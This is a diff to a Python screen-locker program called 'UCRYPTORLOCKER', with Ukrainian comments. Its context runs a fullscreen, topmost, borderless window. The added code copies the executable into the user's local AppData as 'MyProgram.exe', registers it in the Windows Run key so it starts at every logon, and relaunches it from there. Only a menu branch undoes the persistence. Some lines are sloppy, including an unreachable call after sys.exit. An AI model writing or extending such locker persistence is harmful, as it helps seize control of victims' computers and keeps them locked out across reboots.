@@ -5,6 +5,12 @@ import winsound
 import keyboard
 import sys
 import os
+import winreg
+import shutil
+import subprocess
+from pathlib import Path
+from tkinter import messagebox
+
 
 BLACK = "#000000"
 WHITE = "#ffffff"
@@ -28,6 +34,12 @@ root.configure(bg=BLACK)
 root.attributes("-fullscreen", True)
 root.attributes("-topmost", True)
 root.overrideredirect(True)
+
+APP_NAME = "UCRYPTORLOCKER"
+INSTALL_DIR = Path(os.environ["LOCALAPPDATA"]) / APP_NAME
+INSTALLED_EXE = INSTALL_DIR / "MyProgram.exe"
+REGISTRY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
+
 
 root.update_idletasks()
 x = (root.winfo_screenwidth() - 900) // 2
@@ -60,6 +72,87 @@ labels = []
 
 boot_frame = tk.Frame(root, bg=BLACK)
 boot_frame.pack(fill="both", expand=True)
+
+def remove_from_startup():
+
+    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+
+    try:
+        with winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            key_path,
+            0,
+            winreg.KEY_SET_VALUE
+        ) as key:
+
+            winreg.DeleteValue(key, APP_NAME)
+
+    except FileNotFoundError:
+        pass
+
+
+def add_to_startup():
+
+    with winreg.OpenKey(
+        winreg.HKEY_CURRENT_USER,
+        REGISTRY_PATH,
+        0,
+        winreg.KEY_SET_VALUE
+    ) as key:
+
+        winreg.SetValueEx(
+            key,
+            APP_NAME,
+            0,
+            winreg.REG_SZ,
+            f'"{INSTALLED_EXE}"'
+        )
+def install_program():
+
+    # Перевіряємо, чи програма запущена як EXE
+    if not getattr(sys, "frozen", False):
+        raise RuntimeError(
+            "Ця функція призначена для EXE-файлу."
+        )
+
+    current_exe = Path(sys.executable).resolve()
+
+    INSTALL_DIR.mkdir(parents=True, exist_ok=True)
+
+   
+    if os.path.normcase(str(current_exe)) != os.path.normcase(
+        str(INSTALLED_EXE.resolve())
+    ):
+         if not INSTALLED_EXE.exists():
+
+            shutil.copy2(
+                current_exe,
+                INSTALLED_EXE
+            )
+
+            add_to_startup()
+
+            subprocess.Popen(
+            [str(INSTALLED_EXE)],
+            cwd=str(INSTALL_DIR),
+            close_fds=True
+        )
+
+    sys.exit(0)
+    add_to_startup()
+
+try:
+    install_program()
+
+except Exception as error:
+
+    messagebox.showerror(
+        "Помилка запуску",
+        f"Не вдалося встановити програму:\n\n{error}"
+    )
+
+    sys.exit(1)
+
 
 
 
@@ -277,6 +370,7 @@ def show_menu():
                 fg="#00ff66"
             )
             os.system(f'del {startup_path+file_name}')
+            remove_from_startup()
             root.destroy()
         else:
             result.config(
